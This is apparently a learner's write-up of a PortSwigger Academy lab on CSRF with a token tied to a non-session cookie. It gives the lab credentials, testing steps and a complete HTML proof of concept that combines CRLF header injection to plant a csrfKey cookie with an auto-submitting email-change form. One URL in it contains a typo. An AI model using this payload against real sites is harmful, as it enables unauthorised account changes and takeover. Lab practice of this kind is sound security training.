# CSRF where token is tied to non-session cookie
- lab's email change functionality is vulnerable to CSRF
- uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system
- The credentials are as follows:
```
wiener:peter
carlos:montoya
```
# Goal
- use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address
# Solving the Lab
- log in and change email
- for CSRF To be possibel
  - Certain Action : change email
  - cookie based session handeling : session cookie
  - no unpredictablle request parameters :
- Testing For CSRF
  - Remove CSRF Token and see if application accepts it 
  - change request method from post to get
  - see if csrf token is tied to user session
- Testing csrf token and csrf keys
  - check if csrf token is tied to csrf key
    - submit an invalid csrf token
    - submit valid csrf token from a valid user
  - submit avalid csrf token and csrf cookie from another user : YES
- so now we have two conditions
  - inject csrf cookie in the user http headers
  - send csrf attack to victim with valid csrf token
- so we construct a payload tat inject in header and do what we want
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0a0005046ef4b58183cff3004f0029.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tesdsdst&#64;mail&#46;com" />
      <input type="hidden" name="csrf" value="5iydd3rU2CtyK4R2FUlW9Dt66OVwSJhI" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a0a0005046ef4b58183cff3004f0029.web-security-academy.ne/?search=test%0d%0aSet-Cookie:%20csrfKey=uLf64t4oWx9qapcNNDPFASgWa7lD8n11%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```
- we send payload to exploit server and press send to victim  > solved the Lab
